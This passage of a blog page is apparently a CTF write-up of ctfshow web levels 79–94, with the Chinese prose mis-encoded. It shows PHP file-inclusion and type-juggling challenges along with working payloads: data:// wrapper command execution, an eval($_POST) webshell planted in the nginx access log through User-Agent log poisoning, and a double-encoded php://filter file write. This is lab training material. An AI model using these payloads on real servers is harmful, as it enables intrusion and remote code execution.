src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220927204024137.png"></p><p>base64è§£ç </p><h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);  <span class="comment">//æ›¿æ¢  ï¼Ÿï¼Ÿï¼Ÿ</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>?file=data://text/plain,&lt;?=system(&#39;cat flag.php&#39;)?&gt;</code>        è¿‡æ»¤äº†php,ç”¨çŸ­æ ‡ç­¾ç»•è¿‡</p><p>dataåè®®</p><blockquote><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=eval($_POST[1]);?></p><p>1&#x3D;system(â€˜tac flag.phpâ€™);</p></blockquote><h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220928201551608.png">web80</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220928202614039.png"></p><p>è¿™é‡Œå¯ä»¥è¿›è¡Œæ—¥å¿—åŒ…å«ï¼šé€šè¿‡User-Agentå¤´éƒ¨æ³¨å…¥å‘½ä»¤</p><p>ä¸Šä¼ ä¸€å¥è¯ï¼ŒåŒ…å«æ—¥å¿—é‡Œé¢å»</p><p>æŸ¥è¯¢ç›®å½•</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220928202720913.png"></p><blockquote><?php eval($_POST[1]);?><p>   ä¸€å¥è¯</p><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log      è·¯å¾„</p><p>1&#x3D;system(â€˜tac fl0g.phpâ€™);</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220928202823233.png"></p><h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">\# -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Date</span>:  2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified by:  h1xa</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@Last</span> Modified time: 2020-09-16 15:51:31</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">\# <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ…å«æ—¥å¿—æ–‡ä»¶ è¿›è¡Œgetshell</p><p>åŒ80</p><blockquote><?php eval($_POST[1]);?><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>1&#x3D;system(â€˜tac fl0g.phpâ€™);</p></blockquote><h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†.  åªèƒ½åŒ…å«æ— åç¼€çš„æ–‡ä»¶</p><p>åªèƒ½æ˜¯sessionæ–‡ä»¶</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:57:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);  <span class="comment">//å¯¹fileæ–‡ä»¶è¿›è¡Œurlè§£ç ï¼Œæ‰€ä»¥payloadè¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç ç»•è¿‡</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>contentæ˜¯å†™å…¥å†…å®¹,è¦è¿›è¡Œbase64ç¼–ç  å¯¹åº”ä¸Šé¢çš„ä¼ªåè®®è§£ç ,è€Œbaseè§£ç æ—¶,æ˜¯4ä¸ªä¸€ç»„,flag.php(è¦å†™å…¥çš„æ–‡ä»¶),å†™å…¥çš„å†…å®¹<?php die('å¤§ä½¬åˆ«ç§€äº†');?>ä¸­åªæœ‰phpdieä¼šå‚ä¸base64è§£ç ,å› ä¸ºphpdieåªæœ‰6ä¸ªå­—èŠ‚,è¡¥ä¸¤ä¸ªaå°±æ˜¯8å­—èŠ‚äº†ã€‚æˆ‘ä»¬è¦åœ¨contentä¸­å†™å…¥shell,ç„¶åbase64ç¼–ç </p><p><a href="https://blog.csdn.net/Kracxi/article/details/121887620">å‚è€ƒåŸåšå®¢é“¾æ¥</a></p><p>GET:</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>ä¸¤æ¬¡urlç¼–ç åï¼ˆä¸€æ¬¡å®Œå…¨ç¼–ç ï¼Œä¸€æ¬¡æ™®é€šç¼–ç ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=%2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2565%256E%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2566%256C%2561%2567%252E%2570%2568%2570</span><br></pre></td></tr></table></figure><p>POST:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</span><br></pre></td></tr></table></figure><p>è®¿é—®flag.php</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221013160125263.png" alt="image-20221013160125263"></p><h2 id="phpç‰¹æ€§-89â€”190"><a href="#phpç‰¹æ€§-89â€”190" class="headerlink" title="phpç‰¹æ€§(89â€”190)"></a>phpç‰¹æ€§(89â€”190)</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 15:38:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123; <span class="comment">//ä¸èƒ½å‡ºç°0-9</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;  <span class="comment">//è¿˜æ˜¯æ­£çš„</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æäº¤æ•°ç»„ç»•è¿‡     <code>?num[]=1;</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020152451860.png"></p><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:06:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;  <span class="comment">//å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;   <span class="keyword">int</span>å€¼ä¸º<span class="number">4476</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡‡å–åè¿›åˆ¶ç»•è¿‡ï¼Œè¾“å…¥117Cï¼Œä½†æ˜¯117Cåœ¨è¯†åˆ«çš„æ—¶å€™Cä¸ä¼šè¢«è¯†åˆ«ï¼Œåªèƒ½åœ¨å‰é¢åŠ ä¸Š0xå’ŒCä½œä¸ºå¼ºåˆ¶åå…­è¿›åˆ¶è½¬æ¢</p><p><code>?num=0x117C</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020153112445.png"></p><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:16:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;  <span class="comment">//^php$ä»¥phpç»“æŸï¼Œiå¤§å°å†™ï¼Œmå¤šè¡ŒåŒ¹é…</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020153538772.png"></p><p>ç¬¬ä¸€è¡ŒåŒ¹é…ä¸åˆ°ï¼Œåªèƒ½åŒ¹é…åˆ°ç¬¬äºŒè¡Œï¼Œæ‰€ä»¥è¦è¿›è¡Œæ¢è¡Œç»•è¿‡   <code>?cmd=%0aphp</code></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020153723746.png"></p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:29:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020154956679.png"></p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020161233635.png"></p><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:32:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123; <span class="comment">//è¿‡æ»¤äº†å­—æ¯</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20221020193552575.png"></p><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-18 16:46:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;  <span class="comment">//å¼±ç±»å‹</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;  <span class="comment">//ä¸èƒ½å‡ºç°0   